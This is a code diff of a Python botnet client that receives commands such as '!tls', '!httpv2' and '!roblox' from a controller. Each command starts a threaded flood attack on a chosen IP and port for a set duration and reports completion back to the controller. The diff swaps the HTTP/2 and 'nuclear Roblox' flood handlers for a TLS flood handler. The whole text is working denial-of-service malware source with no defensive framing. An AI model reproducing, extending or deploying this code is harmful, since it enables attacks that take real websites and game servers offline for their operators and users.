-                success_rate = (self.successful_requests / (self.successful_requests + self.failed_requests)) * 100 if (self.successful_requests + self.failed_requests) > 0 else 0
-                
-                print(f"\n[✅] HTTP/2 ATTACK COMPLETED")
-                print(f"[📊] FINAL STATISTICS:")
-                print(f"    Total Requests: {self.successful_requests:,}")
-                print(f"    Failed Requests: {self.failed_requests:,}")
-                print(f"    Connections Made: {self.connection_count:,}")
-                print(f"    Proxies Used: {len(self.proxy_list)}")
-                print(f"    Average RPS: {avg_rps:.1f}/s")
-                print(f"    Success Rate: {success_rate:.1f}%")
+                avg_pps = self.packets_sent / total_time
+                print(f"\n[+] TLS Attack completed")
+                print(f"[+] Total packets sent: {self.packets_sent}")
+                print(f"[+] Average PPS: {avg_pps:.1f}/s")
             else:
-                print(f"\n[✅] HTTP/2 ATTACK STOPPED IMMEDIATELY")
-
-    def start(self):
-        """Main start method - begins with proxy scraping to memory"""
-        self.scrape_and_start()
+                print(f"\n[+] TLS Attack stopped immediately")
 
     def stop(self):
-        """Stop the HTTP/2 flood attack"""
+        """Stop TLS flood attack"""
         self.running = False
         self.stop_event.set()
-        self.log("STOP command received - Stopping all threads")
+        self.log("TLS Flood STOP command received")
         
+        # Wait for threads to terminate
         for thread in self.threads:
-            thread.join(timeout=5.0)
+            thread.join(timeout=3.0)
         
-        # Clear proxy list from memory
-        self.proxy_list.clear()
-        self.log("All HTTP/2 flood threads stopped - Proxies cleared from memory")
-
+        self.log("All TLS flood threads stopped")
 
 
 # =========================
@@ -3156,118 +2561,20 @@ class BotClient:
                     return response
                 else:
                     return "Usage: !http <ip/url> <port> <duration> [method] [path] [ssl]"
-
-            elif cmd_str.startswith("!httpv2"):
+            
+            elif cmd_str.startswith("!tls"):
                 parts = cmd_str.split()
                 if len(parts) >= 5:
                     ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]
-        
-                    # Parse target (supports both IP and URL)
-                    try:
-                        from urllib.parse import urlparse
-                        target_input = ip
-        
-                        if target_input.startswith(('http://', 'https://')):
-                            parsed = urlparse(target_input)
-                            target_host = parsed.hostname
-                            target_port = int(port) if port else (443 if parsed.scheme == 'https' else 80)
-                        else:
-                            target_host = target_input
-                            target_port = int(port)
-        
-                    except Exception as e:
-                        return f"Error parsing target: {e}"
-        
-                    method = "GET"
-                    path = "/"
-                    ssl = True  # HTTP/2 requires SSL
-        
-                    # Parse additional parameters
-                    for i in range(4, len(parts)):
-                        param = parts[i].upper()
-                        if param in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'RAND']:
-                            method = param
-                        elif param.startswith('/'):
-                            path = param
-        
-                    def start_http2_attack(attack_id, host, port, duration, method, path, ssl):
-                        try:
-                            self.log(f"Starting HTTP/2 attack {attack_id} on {host}:{port} for {duration}s")
-                            flooder = HTTP2RushFlood(host, int(port), int(duration), method, path, ssl)
-        
-                            # Store attack info
-                            with self.attack_lock:
-                                self.active_attacks[attack_id] = {
-                                    'thread': threading.current_thread(),
-                                    'attack_obj': flooder,
-                                    'start_time': time.time(),
-                                    'type': 'http2_rush_flood',
-                                    'target': f"{host}:{port}",
-                                    'duration': duration
-                                }
-        
-                            flooder.running = True
-                            flooder.start()
-        
-                            # Attack completed naturally
-                            with self.attack_lock:
-                                if attack_id in self.active_attacks:
-                                    del self.active_attacks[attack_id]
-        
-                            self.log(f"HTTP/2 attack {attack_id} completed: {host}:{port} for {duration}s")
-        
-                            if self.connected:
-                                completion_msg = {
-                                    "type": "attack_complete",
-                                    "bot_id": BOT_ID,
-                                    "attack_id": attack_id,
-                                    "attack_type": "http2_rush",
-                                    "target": f"{host}:{port}",
-                                    'duration': duration,
-                                    "status": "completed"
-                                }
-                                self.socket.send(json.dumps(completion_msg).encode())
-        
-                        except Exception as e:
-                            self.log(f"HTTP/2 attack {attack_id} failed: {e}")
-                            with self.attack_lock:
-                                if attack_id in self.active_attacks:
-                                    del self.active_attacks[attack_id]
-        
-                    # Start the attack in a separate thread
-                    attack_thread = threading.Thread(
-                        target=start_http2_attack, 
-                        args=(attack_id, target_host, target_port, duration, method, path, ssl),
-                        daemon=True
-                    )
-                    attack_thread.start()
-        
-                    # Get current attack count
-                    active_count = self.get_active_attack_count()
-        
-                    response = (f"[🚀] HTTP/2 RUSH FLOOD STARTED (ID: {attack_id})\n"
-                               f"[🎯] Target: {target_host}:{target_port}\n"
-                               f"[⚡] Method: {method} | Duration: {duration}s\n"
-                               f"[📁] Path: {path}\n"
-                               f"[🔧] Features: HTTP/2 Multiplexing + RushAway\n"
-                               f"[👥] Active Attacks: {active_count}\n"
-                               f"[✅] Added to concurrent attacks queue")
-                    self.log(response)
-                    return response
-                else:
-                    return "Usage: !httpv2 <ip/url> <port> <duration> [method] [path]"
-
-
-            elif cmd_str.startswith("!roblox"):
-                parts = cmd_str.split()
-                if len(parts) >= 4:
-                    ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]
-                    #attack_id = self.generate_attack_id()
                     
-                    def start_roblox_attack(attack_id, ip, port, duration):
+                    method = "GET"
+                    if len(parts) > 5:
+                        method = parts[5].upper()
+                    
+                    def start_tls_attack(attack_id, ip, port, duration, method):
                         try:
-                            self.log(f"Starting Roblox attack {attack_id} on {ip}:{port} for {duration}s")
-                            flooder = RobloxFlood(ip, int(port), int(duration))
+                            self.log(f"Starting TLS attack {attack_id} on {ip}:{port} for {duration}s")
+                            flooder = TLSFloodAttack(ip, int(port), int(duration), method)
                             
                             # Store attack info
                             with self.attack_lock:
@@ -3275,26 +2582,27 @@ class BotClient:
                                     'thread': threading.current_thread(),
                                     'attack_obj': flooder,
                                     'start_time': time.time(),
-                                    'type': 'roblox_flood',
+                                    'type': 'tls_flood',
                                     'target': f"{ip}:{port}",
                                     'duration': duration
                                 }
                             
-                            flooder.start_nuclear_attack()
+                            flooder.running = True
+                            flooder.start()
                             
                             # Attack completed naturally
                             with self.attack_lock:
                                 if attack_id in self.active_attacks:
                                     del self.active_attacks[attack_id]
                             
-                            self.log(f"Roblox attack {attack_id} completed: {ip}:{port} for {duration}s")
+                            self.log(f"TLS attack {attack_id} completed: {ip}:{port} for {duration}s")
                             
                             if self.connected:
                                 completion_msg = {
                                     "type": "attack_complete",
                                     "bot_id": BOT_ID,
                                     "attack_id": attack_id,
-                                    "attack_type": "roblox",
+                                    "attack_type": "tls",
                                     "target": f"{ip}:{port}",
                                     'duration': duration,
                                     "status": "completed"
@@ -3302,29 +2610,31 @@ class BotClient:
                                 self.socket.send(json.dumps(completion_msg).encode())
                                 
                         except Exception as e:
-                            self.log(f"Roblox attack {attack_id} failed: {e}")
+                            self.log(f"TLS attack {attack_id} failed: {e}")
                             with self.attack_lock:
                                 if attack_id in self.active_attacks:
                                     del self.active_attacks[attack_id]
 
                     # Start the attack in a separate thread
                     attack_thread = threading.Thread(
-                        target=start_roblox_attack, 
-                        args=(attack_id, ip, port, duration),
+                        target=start_tls_attack, 
+                        args=(attack_id, ip, port, duration, method),
                         daemon=True
                     )
                     attack_thread.start()
 
                     active_count = self.get_active_attack_count()
-                    response = (f"[💀] NUCLEAR ROBLOX FLOOD STARTED (ID: {attack_id})\n"
-                               f"[🎯] Target: {ip}:{port}\n"
-                               f"[⏱️] Duration: {duration}s\n"
-                               f"[👥] Active Attacks: {active_count}\n"
-                               f"[✅] Added to concurrent attacks queue")
+                    response = (f" TLS FLOOD STARTED (ID: {attack_id})\n"
+                               f"Target: {ip}:{port}\n"
+                               f"Method: {method} | Duration: {duration}s\n"
+                               f"Protocol: TLS/SSL Encrypted\n"
+                               f"Active Attacks: {active_count}\n"
+                               f"Added to concurrent attacks queue")
                     self.log(response)
                     return response
                 else:
-                    return "Usage: !roblox <ip> <port> <duration>"
+                    return "Invalid !tls command format. Usage: !tls <ip> <port> <duration> <attack_id> [method]"
+
 
             elif cmd_str == "!stop":
                 # If we only got "!stop", try to get the first active attack
@@ -3473,7 +2783,3 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"[-] Bot error: {e}")
         bot.stop()
-
-
-
-
